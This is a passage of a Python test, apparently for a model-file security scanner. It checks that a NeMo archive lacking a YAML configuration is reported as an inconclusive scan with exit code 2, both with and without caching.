        assert direct_result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
        assert "nemo_config_missing" in direct_result.metadata["scan_outcome_reasons"]
        no_config = [
            check
            for check in direct_result.checks
            if check.name == "NeMo Config Presence" and check.status == CheckStatus.FAILED
        ]
        assert len(no_config) == 1
        assert no_config[0].message == "No YAML configuration found in NeMo archive"
        assert no_config[0].details["scan_outcome_reason"] == "nemo_config_missing"

        metadata = aggregate_result.file_metadata[str(nemo_path)]
        assert aggregate_result.success is False
        assert metadata.get("scan_outcome") == INCONCLUSIVE_SCAN_OUTCOME
        assert "nemo_config_missing" in metadata.get("scan_outcome_reasons", [])
        assert determine_exit_code(aggregate_result) == 2

        cache_dir = tmp_path / "cache"
        reset_cache_manager()
        try:
            cached_aggregate = scan_model_directory_or_file(
                str(nemo_path),
                cache_enabled=True,
                cache_dir=str(cache_dir),
                min_cache_file_size=0,
            )
            cached_metadata = cached_aggregate.file_metadata[str(nemo_path)]

            assert cached_aggregate.success is False
            assert cached_metadata.get("scan_outcome") == INCONCLUSIVE_SCAN_OUTCOME
            assert "nemo_config_missing" in cached_metadata.get("scan_outcome_reasons", [])
            assert determine_exit_code(cached_aggregate) == 2
            assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
        finally:
            reset_cache_manager()
